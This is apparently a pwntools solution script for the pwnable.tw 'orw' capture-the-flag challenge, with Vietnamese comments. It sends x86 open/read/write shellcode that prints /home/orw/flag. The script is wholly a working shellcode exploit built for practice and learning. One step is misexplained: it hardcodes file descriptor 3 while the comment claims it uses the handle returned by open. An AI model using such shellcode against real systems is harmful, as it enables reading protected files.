
from pwn import * 

r = remote("chall.pwnable.tw",10001)
shellcode = asm("push 0x0")
shellcode += asm("push 0x67616c66") #flag
shellcode += asm("push 0x2f77726f") #orw/
shellcode += asm("push 0x2f656d6f") #ome/
shellcode += asm("push 0x682f2f2f") #///h
shellcode += asm("mov ebx, esp") #gán esp vào ebx, ebx- * file : esp
shellcode += asm("xor eax, eax") #khởi tạo eax
shellcode += asm("xor edx,edx") #edx mode = 0, read only
shellcode += asm("xor ecx, ecx") #ecx-flag: 0
shellcode += asm("mov eax, 0x05") #eax mode = 5, open
shellcode += asm("int 0x80") #syscall, syscall mình đã giải thích ở bài trước 
shellcode += asm("mov eax, 0x03") #eax mode = 3, read(3)
shellcode += asm("mov ebx,eax") #ebx-fd = eax, có nghĩa là handle->/home/orw/flag (3)
shellcode += asm("mov ecx,esp") #ecx-* buf: esp
shellcode += asm("mov edx, 0x40") #edx-size: 0x40
shellcode += asm("int 0x80") #syscall
shellcode += asm("mov eax, 0x04") #eax mode = 4, write(4)
shellcode += asm("mov ebx, 0x01") #ebx-fd: stdout(1)
shellcode += asm("int 0x80") #syscall
print(shellcode)
r.sendline((shellcode))

r.interactive()